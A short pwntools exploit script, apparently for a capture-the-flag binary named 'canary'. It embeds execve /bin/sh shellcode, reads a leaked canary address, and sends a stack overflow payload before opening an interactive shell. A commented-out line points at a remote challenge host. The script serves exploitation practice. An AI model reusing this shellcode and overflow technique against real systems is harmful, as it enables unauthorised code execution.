from pwn import *
#p = remote('185.97.117.19',7030)
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
#sc2 = "\x31\xc0\x50\x6a\x61\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80"
sc3 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
p = process('./canary')
gdb.attach('canary')
p.send('\n')
test = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL"
p.sendlineafter('Enter second string (up to 15 chars): ',test)
p.recvuntil(' canary address: ')
x = int(p.recv(14),16)
print hex(x)
exp = "A"*12+"AAAAAAAA"+p64(x)+"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
p.sendlineafter("number: ",exp)
p.interactive()

